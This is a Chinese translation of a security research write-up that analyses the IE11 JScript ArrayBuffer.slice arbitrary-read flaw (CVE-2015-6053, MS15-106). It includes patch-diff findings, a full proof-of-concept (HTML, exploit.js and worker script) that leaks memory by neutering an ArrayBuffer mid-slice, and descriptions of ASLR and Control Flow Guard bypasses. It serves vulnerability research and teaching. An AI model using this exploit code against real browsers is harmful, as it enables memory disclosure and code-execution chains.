# MS15-106 JScript ArrayBuffer.slice 任意地址读漏洞分析

0x00 引言
=====

> _这是“Exploiting Internet Explorer’s MS15-106”系列文章的第二部分，如果您没有阅读过[第一部分](https://blog.coresecurity.com/2016/04/25/exploiting-internet-explorers-ms15-106-part-i-vbscript-filter-type-confusion-vulnerability-cve-2015-6055/)，我建议您开始阅读本篇之前去阅读前置文章_

系列的前一篇文章提到过，2015年的8月13日，微软放出了更新补丁security bulletin MS15-106，里面包含了有关Internet Explorer的多个漏洞。之前，我们已经解释了怎样攻击VBScript引擎里面Filter函数中存在的类型混淆漏洞，以及怎样利用这个漏洞劫持IE代码执行流程。不论怎样，我们都需要绕过ASLR保护才能在有漏洞的浏览器中执行任意代码，用前一个漏洞过掉ASLR是很困难的。那么，我们来看下怎样攻击另一个同样披露于MS15-106中的漏洞，以及怎样过掉地址随机化。我们现在即将讨论的是ZDI于[advisory ZDI-15-518](http://www.zerodayinitiative.com/advisories/ZDI-15-518/)描述的漏洞：JScript ArrayBuffer.slice Information Disclosure Vulnerability (CVE-2015-6053)。

引用ZDI的描述：

> The specific flaw exists within the implementation of the ArrayBuffer.slice method. By supplying specially crafted parameters, an attacker can read the contents of arbitrary memory locations. An attacker can use this information in conjunction with other vulnerabilities to execute code in the context of the process.

0x01 二进制比对
=====

比对的样本是 jscript9.dll 5.8.9600.18036（漏洞版本）和 jscript9.dll 5.8.9600.18052（修复版本），和上一篇文章中一样，测试平台是64位windows8.1和IE11。

ZDI说明中提到问题出现在JavaScript的ArrayBuffer.slice方法中，通过比对两个不同版本的DLL文件，可以确定函数Js::ArrayBuffer::EntrySlice()被补丁过了。

![p1](http://drops.javaweb.org/uploads/images/188ad8a9e314167c9cc15ef9009f1caa996b1ea4.jpg)

MSDN中有关[ArrayBuffer.slice](https://msdn.microsoft.com/en-us/library/dn641192%28v=vs.94%29.aspx)的描述为：

![p2](http://drops.javaweb.org/uploads/images/fc519dc71c369188bc2aa244ff79c5296cd42b43.jpg)

这个函数流程大致预览对比如下：

![p3](http://drops.javaweb.org/uploads/images/365ae920c546027c7c18f1cbef305070f82d38e7.jpg)

进入函数Js::ArrayBuffer::EntrySlice()详细看，注意红色方框里面的代码：

![p4](http://drops.javaweb.org/uploads/images/689a390c0eea336e3bf2dcce5c3e826f46a89008.jpg)

右边红色方框里面，增加了Js::ArrayBuffer::EntrySlice()函数检查：补丁后的版本检查了ArrayBuffer结构体偏移0x10字节的内容，如果这里不是0的话，就抛出TypeError异常。

But...ArrayBuffer结构体偏移0x10字节的成员是什么？

观察下Js::ArrayBuffer类，在初始化的时候偏移0x10的位置被设置成0，然后函数Js::ArrayBuffer::CreateNeuteredState()将偏移0x10这里的数值设置成它的参数：

![p5](http://drops.javaweb.org/uploads/images/817e2a754a05ef6233d5f5c30400b511c77ac316.jpg)

(译者：CreateNeuteredState()这个函数名字里面的Neutered是阉割、绝育的意思)

如此，这个偏移0x10字段的内容标志着ArrayBuffer是否被结扎，也就是说，如果在一个结扎过的ArrayBuffe里调用slice()方法的话，就会抛出TypeError异常。

了解了补丁的意义之后，我立刻想到这个bug和之前Pwn2Own2014上攻击FireFox的方法有些类似：

[https://bugzilla.mozilla.org/show_bug.cgi?id=982974](https://bugzilla.mozilla.org/show_bug.cgi?id=982974)

0x02 结扎ArrayBuffer
=====

那么，到底什么才是结扎ArrayBuffer？

就像[这里](http://robert.ocallahan.org/2013/07/avoiding-copies-in-web-apis.html)描述的，"当一个ArrayBuffer对象被传递给另一个线程的时候，原线程里的ArrayBuffer对象就会被结扎——原对象的长度字段被置0；其成员所在的内存被分离；所属关系被交给了目的线程；目的线程会创建一个新的ArrayBuffer对象，这个对象包含了传递过来的原对象的成员所在的内存，这样，原对象的成员内容并不需要被复制。"

换句话说，当一个ArrayBuffer对象被结扎，它的长度变成0，对象里指向成员内存的指针被置成NULL。想要结扎一个ArrayBuffer对象，可通过把他从[Web Worker](https://msdn.microsoft.com/en-us/library/hh673568%28v=vs.85%29.aspx)中传递出去。

下一个问题是：怎样才能把ArrayBuffer从Web Worker中传递出去？

引述[http://www.html5rocks.com/en/tutorials/webgl/typed_arrays/](http://www.html5rocks.com/en/tutorials/webgl/typed_arrays/):

> Transferable objects in postMessage make passing binary data to other windows and Web Workers a great deal faster. When you send an object to a Worker as a Transferable, the object becomes inaccessible in the sending thread and the receiving Worker gets ownership of the object. This allows for a highly optimized implementation where the sent data is not copied, just the ownership of the Typed Array is transferred to the receiver. To use Transferable objects with Web Workers, you need to use the webkitPostMessage method on the worker.The webkitPostMessage method works just like postMessage, but it takes two arguments instead of just one.The added second argument is an array of objects you wish to transfer to the worker.`worker.webkitPostMessage(oneGBTypedArray, [oneGBTypedArray]);`

到目前，我们可知，创建一个ArrayBuffer对象，然后通过postMessage()传递给Web Worker，这样的话，这个ArrayBuffer就被结扎了(长度变成0，数据指针被置null)。

但，漏洞在哪？IE做了和FireFox相同的事情，当运行ArrayBuffer.slice()方法的时候，代码逻辑去保存ArrayBuffer中当前有效的byteLength：

![p6](http://drops.javaweb.org/uploads/images/dccbf0cd812be1fe7c7abfac59759391d19afecf.jpg)

当ArrayBuffer.slice()方法的参数不是原始类型，就会调用当前传递进来的对象的成员函数valueOf()。这个过程发生在Js::ArrayBuffer::GetIndexFromVar()函数内部。

![p7](http://drops.javaweb.org/uploads/images/86f824bece40bd4a56cc26d2fc4016bb71153421.jpg)

攻击的思路，在FireFox Pwn2Own里解释过，就是利用这样一个原理：原生代码会调用攻击者构造的JS代码(攻击者控制的对象里面的valueOf()函数)，以此来实现在Js::ArrayBuffer::EntrySlice()函数内部(错误地)结扎ArrayBuffer对象。就是说，我们就构造了一个前后矛盾的情况——正常的byteLength值在函数一开始的时候被保存，而经过两次Js::ArrayBuffer::GetIndexFromVar()调用，对象却又被结扎。

顺便提下，这是有关攻击ECMAScript引擎重定义的另一个例子，[Natalie Silvanovich](https://twitter.com/natashenka)在[Black Hat 2015 presentation](https://www.blackhat.com/us-15/briefings.html#attacking-ecmascript-engines-with-redefinition)的议题。

(译者：原文这里说得不是很明白，其实就是通过重定义valueOf()函数，强迫对象被Neutered，指针清零，导致后面的start_argument被当做读取地址，形成任意地址读的漏洞)

ArrayBuffer在Js::ArrayBuffer::EntrySlice()函数里被意外地结扎后，这个函数试着去创建一个被结扎的ArrayBuffer对象的副本：

![p8](http://drops.javaweb.org/uploads/images/ec2f89758a107da9bd93515d09e9e40f17fe6b4e.jpg)

函数memcpy()的参数具体如下：

*   dst参数指向新的ArrayBuffer对象的ptr_to_raw_data字段(新ArrayBuffer对象会被ArrayBuffer.slice()函数返回)
*   src参数为ptr_to_raw_data + start_argument
*   size参数为end_argument – start_argument

问题出现在src参数上，由于ArrayBuffer被结扎，src参数应该计算成ptr_to_raw_data + start_argument = 0 + start_argument，这导致在调用memcpy(new_arraybuffer, arbitrary_src, arbitrary_size)的时候，我们可以泄露浏览器进程的任意地址内存。

同时要注意，start_argument和end_argument会被和原来的ArrayBuffer里的byteLength对比检查，也就是说，要泄露任意地址X的内容，被攻击者操纵的ArrayBuffer的byteLength数值必须必X大。比如，想要在地址0x1a1b2000处读取4bytes内容的话，必须这样做：

```
var address = 0x1a1b2000;

/* Size of the ArrayBuffer must be greater than the 'start' and 'end' arguments for slice() */
var arrbuf = new ArrayBuffer(address + 0x10);

/* The 'Trigger' object implements the valueOf() method, which neuters arrbuf in the middle of the slice() operation, and finally returns the end offset (address+4). */
var trigger = new Trigger(address + 4, arrbuf);

/* Trigger the vulnerability. Note that the 2nd argument isn't a primitive value but an object. slice() will return a new ArrayBuffer object containing a copy of the 4 bytes stored @ address 0x1a1b2000 */
var kslice = arrbuf.slice(address, trigger);

/* Finally, create a DataView on the new ArrayBuffer object and read a dword from it. Bingo! */
var leaked_dword= new DataView(kslice).getUint32(0, true);

```

0x03 Proof of Concept
=====

我们来看POC，这是index.html的代码：

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>MS15-106 PoC (CVE-2015-6053)</title>
    <script type="text/javascript" src="exploit.js"></script>
</head>
<body>
    <h1>MS15-106 PoC (CVE-2015-6053)</h1>

    <div>

        <div>
            <fieldset>
                <button id="workersButton">Transfer/neuter ArrayBuffer</button>
                <div id="outputBoxWorkers"></div>
            </fieldset>
        </div>
    </div>

</body>
</html>

```

然后是exploit.js的部分，包含了攻击的逻辑。当点击“Transfer/neuter ArrayBuffer”按钮的时候，leak_dword(0xffff)函数被调用。leak_dword()函数接受一个内存地址作为参数，然后利用这个漏洞在这个地址读取4bytes内容。这里读取0xffff地址的内容，出发了一个访问异常，来做为演示。

最有趣的部分是Trigger类的代码，它的构造函数接受对象的end_offset作为一个ArrayBuffer的实例当做参数。这个类也实现了valueOf()函数，其被原生函数Js::ArrayBuffer::EntrySlice()调用到的时候，即把ArrayBuffer的从属关系交给一个新的Web Worker，从而实现结扎ArrayBuffer，最后返回对象的end_offset。

同样注意下leak_dword()把一个Trigger类的实例当做第二个参数调用漏洞函数slice()。

```
(function () {
    var the_worker = null; // Will contain a reference to a Web Worker "thread".

    function initialize() {
        document.getElementById('workersButton').addEventListener('click', handle_workersButton, false);
    }

    document.addEventListener("DOMContentLoaded", initialize, false);


    function Trigger(end_offset, arrbuf){
        this.end_offset = end_offset;
        this.arrbuf = arrbuf;
    }

    /* This method gets called from the middle of the Js::ArrayBuffer::EntrySlice() native function */
    Trigger.prototype.valueOf = function() {
        this.neuter_arraybuffer();
        return this.end_offset;
    }

    Trigger.prototype.neuter_arraybuffer = function() {
      if (the_worker) {
        the_worker.terminate();
        the_worker = null; // Allow the garbage collector to clean up the Web Worker object.           
      }

      the_worker = new Worker('the_worker.js');

      the_worker.onmessage = function(evt) {
        if (evt.data.msg){
            document.getElementById('outputBoxWorkers').innerHTML = evt.data.msg;
        }

      }
      /* Neuter the ArrayBuffer by transferring its ownership to a new Web Worker */
      the_worker.postMessage(this.arrbuf, [this.arrbuf]);

    }

    /* Returns a 32-bit integer with the leaked dword value */
    function leak_dword(address){
        var arrbuf = new ArrayBuffer(address + 0x10);
        var trigger = new Trigger(address + 4, arrbuf); 
        var kslice = arrbuf.slice(address, trigger);
        return new DataView(kslice).getUint32(0, true);
    }


    function handle_workersButton(){
        var trampoline_addr = leak_dword(0xffff);
    }

})();

```

最后是假的Web Worker代码(the_worker.js)：

```
self.onmessage = function(evt) {
  var arrbuf = evt.data;
}

```

如果你用调试器附加浏览器后运行这个POC，会得到Crash，崩溃在memcpy()，从地址0xffff非法读取：

```
(84c.8ac): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found. Defaulted to export symbols for msvcrt.dll -
msvcrt!memcpy+0x52:
7785b3f2 8b448efc mov eax,dword ptr [esi+ecx*4-4] ds:002b:0000ffff=????????

```

0x04 Bypassing ASLR
=====

正如您所见，上面的poc会导致IE崩溃在读取未分页地址0xffff。如果要写完整的exploit的话，就需要泄露一些已知的有用的地址内容。由于IE即使在64位windows上也会默认运行32位的版本，采用[古师傅](https://twitter.com/guhe120)的数组喷射技术——ExpLib2来在指定位置放置任意对象，这放置ArrayBuffer对象在堆中的特定位置，然后利用内存泄露漏洞读取它的vtable(jscript9!Js::JavascriptArrayBuffer::`vftable')地址。这个方法可以获得jscript9.dll模块的基址，从而过掉ASLR。

这个基址被传递给了exploit的第二部分(VBScript的Filter函数的类型混淆漏洞，导致任意代码执行，在[上一篇](https://blog.coresecurity.com/2016/04/25/exploiting-internet-explorers-ms15-106-part-i-vbscript-filter-type-confusion-vulnerability-cve-2015-6055/)中讨论过)。

这里有趣的一点是，内存泄露漏洞只影响IE11，因为漏洞函数ArrayBuffer.slice()在低版本IE中并不支持。所以利用这个漏洞必须要IE11的文档模式，同时，[VBScript又在IE11中不再支持](https://msdn.microsoft.com/en-us/library/dn384057%28v=vs.85%29.aspx)，所以利用VBSript漏洞的时候又要切换到IE10的文档模式。

到此，我们已经绕过了ASLR，并且有了获取EIP控制权的第二个漏洞，但还有最后一个防护要绕过：Control Flow Guard

0x05 Bypassing Control Flow Guard
=====

有关CFG已经讨论过很多次，调用函数之前会用ntdll!LdrpValidateUserCallTarget函数验证。

编译器会在每一个调用之前都放置一个CFG验证函数，[我去年讨论过CFG绕过技术](https://blog.coresecurity.com/2015/03/25/exploiting-cve-2015-0311-part-ii-bypassing-control-flow-guard-on-windows-8-1-update-3/)——利用Adobe Flash的JIT编译中没有被CFG保护的函数。

所以这次，我问自己：能否在一个指定的二进制文件中找到没有被VS C++编译器CFG保护的函数？

你一定不想人工肉身做这件事，我写了一个IDAPython脚本，来横跨浏览整个二进制文件，寻找没有被CFG保护的函数调用和跳转存在的函数，同时这些函数又被CFG认为是合法的，最后将符合条件的函数保存成一个列表。

你已可猜到，假设我们可以从一个被CFG保护的函数里跳转到任意地址，那就从这个被保护的函数里面，控制跳转地址，跳到我们想要的地址，绕过CFG。

脚本跑出的结果再经过人工删选，最终的最优解如下：

![p9](http://drops.javaweb.org/uploads/images/a6670d20b204c45d8b95f6983a01b99a5d137a10.jpg)

看下Js::DynamicProfileInfo::EnsureDynamicProfileInfoThunk()函数的代码，它调用(标记为红色的jmp eax)函数Js::DynamicProfileInfo::EnsureDynamicProfileInfo()返回的指针，而没有经过CFG检查，这就是我们想要的情况。

但是函数Js::DynamicProfileInfo::EnsureDynamicProfileInfoThunk()并未被标记为CFG合法的函数，它前面的函数sub_10162CE0却被标记为合法的CFG函数，而且这个函数非常简单，只有一条人畜无害的指令MOV EAX, EAX，意思是顺延到下一个函数：Js::DynamicProfileInfo::EnsureDynamicProfileInfoThunk()，呵呵哒，条件达成！

更完美的是，Js::DynamicProfileInfo::EnsureDynamicProfileInfo()函数接受的参数(IDA里显示，应该是一个Js::ScriptFunction对象的指针)正好可以被我们完全控制。这里截取一小段上一篇文章的代码，VBScript里面的漏洞VAR::ObjGetDefault + 0x6b处，一个完全由我们控制的值被压栈，然后调用CFG保护的函数：

![p10](http://drops.javaweb.org/uploads/images/2c1d87576acd8ddde525489ef93b4700de4f42c8.jpg)

也就是说，我们可以提供一个假的Js::ScriptFunction对象指针给函数Js::DynamicProfileInfo::EnsureDynamicProfileInfo()，通过精心构造(古师傅的喷射代码是你忠实的小伙伴)一个假的指针链交给Js::DynamicProfileInfo::EnsureDynamicProfileInfo()，这个函数会返回一个我们控制的指针，交给后面的jmp eax跳转。

### 稍微总结下

触发VBScript的类型混淆函数之后，CFG保护的CALL [ESI]指令会调用jscript!sub_10162CE0，这个函数是CFG合法的，然后这个函数顺延执行到Js::DynamicProfileInfo::EnsureDynamicProfileInfoThunk()，我们可以完全控制这个函数里面调用的Js::DynamicProfileInfo::EnsureDynamicProfileInfo()函数的参数，精心构造的指针链让这个函数返回我们ROP链的地址，然后这个ROP就被没有CFG保护的jmp eax调用。就是这样啦，绕过了CFG。

### 最后一点讨论

我们和微软MSRC的人邮件讨论过关于这种绕过CFG的方法，他们说这种方法之前由[腾讯玄武](http://xlab.tencent.com/en/2016/01/04/use-chakra-engine-again-to-bypass-cfg/)的人率先在Chakra JS引擎上提出。

腾讯的人用的是Js::JavascriptFunction::DeferredParsingThunk()函数绕过CFG，而我们用的是Js::DynamicProfileInfo::EnsureDynamicProfileInfoThunk()；腾讯用的方法是覆盖合法的Js::ScriptFunction对象里面的函数指针，而我们采用了古师傅的堆喷射方法；第三点不同是我们通过VBScript模块跳转到未受保护的jmp eax，而玄武实验室是通过JS引擎跳过去的。

不过这都无所谓啦，Chakra.dll已经被补丁过，所以这种CFG绕过方法在Edge浏览器上再也不能用啦。

0x06 原文
=====

*   [https://blog.coresecurity.com/2016/06/14/exploiting-internet-explorers-ms15-106-part-ii-jscript-arraybuffer-slice-memory-disclosure-cve-2015-6053/](https://blog.coresecurity.com/2016/06/14/exploiting-internet-explorers-ms15-106-part-ii-jscript-arraybuffer-slice-memory-disclosure-cve-2015-6053/)